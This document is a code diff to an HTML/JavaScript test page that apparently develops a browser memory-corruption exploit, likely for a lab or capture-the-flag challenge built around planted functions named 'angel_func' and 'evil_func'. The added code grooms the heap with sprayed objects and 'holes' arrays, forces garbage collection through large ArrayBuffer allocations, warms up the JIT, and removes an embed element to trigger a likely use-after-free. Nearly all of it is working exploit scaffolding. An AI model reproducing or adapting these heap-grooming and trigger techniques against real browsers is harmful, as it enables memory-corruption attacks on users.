@@ -3,20 +3,71 @@
 </head>
     
 <body>
-<iframe id="frame" src="http://127.0.0.1/tmp.html"></iframe>
+<iframe id="frame" src=""></iframe>
 <br>
+<button onclick="start()">Start</button>
+<button onclick="createEmbedded()">Create embed</button>
+<button onclick="removeEmbedded()">Remove embed</button>
 <button onclick="trigger()">Trigger</button>
 <button onclick="query()">Query</button>
 <button onclick="alloc()">Alloc</button>
-<br>
-<p id="log">
-</p>
-<br>
+<button onclick="gc()">gc</button>
+<button onclick="spray()">Spray</button>
+<button onclick="optimize()">JS Optimize</button>
 <script>
 var audioContext;
 var analyserNode;
 var worker;
-var barrier;
+var barrier = [];
+var embed;
+var holes = [];
+
+function start() {
+    document.getElementById("frame").src = "http://127.0.0.1/tmp.html";
+}
+
+function optimize() {
+    for (let i = 0; i < 0x10000; ++i)
+	worker.GetURL();
+}
+
+function createEmbedded() {
+    embed = document.createElement("embed");
+    embed.setAttribute('src', "data:video/mp4;");
+    document.body.appendChild(embed);
+    embed.addEventListener("DOMNodeRemoved", function() {
+    	alert(embed.GetURL);
+    });
+}
+
+function removeEmbedded() {
+    document.body.removeChild(embed);
+}
+
+function spray() {
+    let tmp1;
+    let tmp2;
+    for (let i = 0; i < 207; ++i) {
+	barrier.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+    }
+    for (let j = 0; j < 2; ++j) {
+	let tmp_arr = []
+	if (j == 0)
+	    tmp1 = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+	else
+	    tmp2 = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+	for (let i = 0; i < 250; ++i) {
+	    tmp_arr.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+	}
+	holes.push(tmp_arr);
+    }
+    analyserNode.angel_func(worker, tmp1);
+    analyserNode.angel_func(worker, tmp2);
+    tmp1 = undefined;
+    tmp2 = undefined;
+    for (let i = 0; i < 10; ++i)
+	gc();
+}
 
 function MyObject() {
     this.name = "Object";
@@ -26,25 +77,23 @@ function MyObject() {
 }
 
 function alloc() {
-    let tmp = new MyObject();
-    d = {a: "a", b: "b", c: "c", d: "d", e: "e"};
-    analyserNode.angel_func(worker, d);
+    barrier = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+    analyserNode.angel_func(worker, barrier);
 }
 
 function gc() {
     for (let i = 0; i < 0x50; i++) { new ArrayBuffer(0x1000000); }
 }
 function trigger() {
-    worker.GetURL();
-    // document.getElementById("frame").src = "http://127.0.0.1/tmp2.html";
+    document.getElementById("frame").src = "http://127.0.0.1/tmp2.html";
     gc();
 }
 function query() {
-    gc();
-    barrier = createPluginReplacement();
+    // gc();
+    // barrier = createPluginReplacement();
+    // let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
     analyserNode.evil_func(worker);
 }
-
 
 window.addEventListener("message", (event) => {
     worker = window.frames[0].document.getElementById("worker");
